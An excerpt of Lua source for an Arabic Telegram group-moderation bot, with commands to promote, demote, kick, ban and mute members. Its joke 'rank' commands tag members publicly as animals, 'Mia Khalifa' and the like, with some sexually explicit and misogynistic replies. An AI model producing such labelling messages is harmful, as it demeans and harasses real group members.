t = " ꨄ︎ لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفعسبريت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفعسبريت@(.*)$") and Sudo(msg) then
local username = text:match("^رفعسبريت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفعسبريت(%d+)$") and Sudo(msg) then
local userid = text:match("^رفعسبريت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيلسبريت") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيلسبريت@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيلسبريت@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيلسبريت(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيلسبريت(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل امر تحويل'
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," ꨄ︎ حساب المنشئ محذوف")
return false  
end
if b.username_ then
...
local Text = " ꨄ︎ منشئ الجروب  ⇇ ["..b.first_name_.."](tg://user?id="..b.id_..")\n"..getbio(b.id_):gsub('لايوجد','')
local msg_id = msg.id_/2097152/0.5
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩 '..b.first_name_..' 𓆪', url="t.me/"..UserName}}, 
}
...
sendText(b.id_," ꨄ︎ مرحبا عزيزي المنشئ هناك شخص يريدك \n ꨄ︎ الشخص  {"..Name.."}\n ꨄ︎ اسم الجروب {"..NameChat.."}\n ꨄ︎ ايدي الجروب {"..msg.chat_id_.."}\n ꨄ︎ رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end,nil)
end
...
Reply_Status(msg,result.sender_user_id_,"reply"," ꨄ︎ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply"," ꨄ︎ تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_," ꨄ︎ لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," ꨄ︎ تم ترقيته مطور ثانوي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply"," ꨄ︎ تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply"," ꨄ︎ تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_," ꨄ︎ لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," ꨄ︎ تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
...
send(msg.chat_id_, msg.id_, "\n ꨄ︎ تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
...
if num2 == 0 then
send(msg.chat_id_, msg.id_," ꨄ︎ لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," ꨄ︎ تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح الادمنيه')
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل الرفع') 
return false
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح المنظفين')
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ꨄ︎  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ꨄ︎ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة مميزين الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ꨄ︎ لعضو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ꨄ︎ الـعـضو   ⇇'..userid..''
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة متوحدين الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ꨄ︎ تم رفع الـعـضو  متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيل الـعـضو  متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمه زوجات الجروب \n ꨄ︎ ═───═❲[`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´](t.me/come_here_to_get)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ꨄ︎ تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح جميع الكلاب')
end
if text == ("تاك للكلاب") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمه كلاب الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ꨄ︎ تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع حمير من الجروب')
end
if text == ("تاك للحمير") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة حمير الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n ꨄ︎ تم رفع المتهم حمار بالجروب\n ꨄ︎ الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة وتكات الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة القرود الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n ꨄ︎ تم رفع قرد في الجروب\n ꨄ︎ تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع الارامل بالجروب')
end
...
if #list == 0 then
t = " ꨄ︎ لا يوجد مايا خليفه في هذا الجروب البائس"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n ꨄ︎ تم رفع مايا خليفه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيل مايا خليفه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة البقرات الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n ꨄ︎ تم رفع بقره في الجروب\n ꨄ︎ ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تنزيل بقره من الجروب\n ꨄ︎ تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع المزز بالجروب')
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع االاكساس')
end
if text == ("تاك للاكساس") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة كساس الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة القلوب في الجروب\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع أولادي')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة رقاصات الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'come_here_to_get')..')'
local statuss = '\n ꨄ︎ تم رفع رقاصه في الجروب\n ꨄ︎ مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'come_here_to_get')..')'
status = '\n ꨄ︎ تم تنزيل رقاصه من الجروب\n ꨄ︎ بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة المتناكين الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'come_here_to_get')..')'
local statuss = '\n ꨄ︎ تم رفع الـعـضو  علي زبك بنجاح\n ꨄ︎ تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة حكاكين الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n ꨄ︎ تم رفع حكاك في الجروب\n ꨄ︎ احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ꨄ︎ تم تنزيل حكاك من الجروب\n ꨄ︎ لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمة نسوان الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n ꨄ︎ تم رفع مره في الجروب\n ꨄ︎ ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ꨄ︎ تم تنزيل مره من الجروب\n ꨄ︎ بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n ꨄ︎ قائمه ازواج الجروب \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ꨄ︎ تم زواجكم بنجاح في الجروب \n ꨄ︎ الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ꨄ︎ تم طلاقكم بنجاح في الجروب\n ꨄ︎ اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل القتل') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
...
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ꨄ︎ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
usertext = '\n ꨄ︎  المستخدم  ⇇['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n ꨄ︎ تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ꨄ︎ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ انا لست محظورآ \n') 
return false 
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم مسح المكتومين')
end
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ꨄ︎ البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ꨄ︎ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
